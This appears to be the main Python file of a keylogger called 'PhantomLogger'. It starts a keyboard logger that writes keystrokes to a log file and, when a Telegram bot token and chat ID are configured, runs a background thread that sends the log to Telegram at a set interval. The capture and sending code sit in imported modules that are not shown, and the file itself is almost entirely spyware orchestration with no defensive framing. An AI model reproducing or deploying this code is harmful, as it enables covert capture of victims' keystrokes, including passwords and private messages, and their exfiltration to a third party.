import os
import threading
from dotenv import load_dotenv
from modules.logger import KeyboardLogger
from modules.telegram_bot import TelegramBot
from modules.utils import get_log_path

load_dotenv()

class PhantomLogger:
    def __init__(self):
        self.log_file = get_log_path()
        
        self.bot_token = os.getenv('BOT_TOKEN')
        self.chat_id = os.getenv('CHAT_ID')
        self.send_interval = int(os.getenv('SEND_INTERVAL', 300))
        self.telegram_enabled = bool(self.bot_token and self.chat_id)
        
        self.keyboard_logger = KeyboardLogger(self.log_file)
        
        if self.telegram_enabled:
            self.telegram_sender = TelegramBot(
                self.bot_token,
                self.chat_id,
                self.log_file,
                self.send_interval
            )
        else:
            self.telegram_sender = None
    
    def phantom_logger_manager(self):
        log_dir = os.path.dirname(self.log_file)
        if log_dir and not os.path.exists(log_dir):
            os.makedirs(log_dir, exist_ok=True)
        
        if self.telegram_sender:
            telegram_thread = threading.Thread(
                target=self.telegram_sender.run,
                daemon=True
            )
            telegram_thread.start()
        
        self.keyboard_logger.start()

if __name__ == "__main__":
    logger = PhantomLogger()
    logger.phantom_logger_manager()
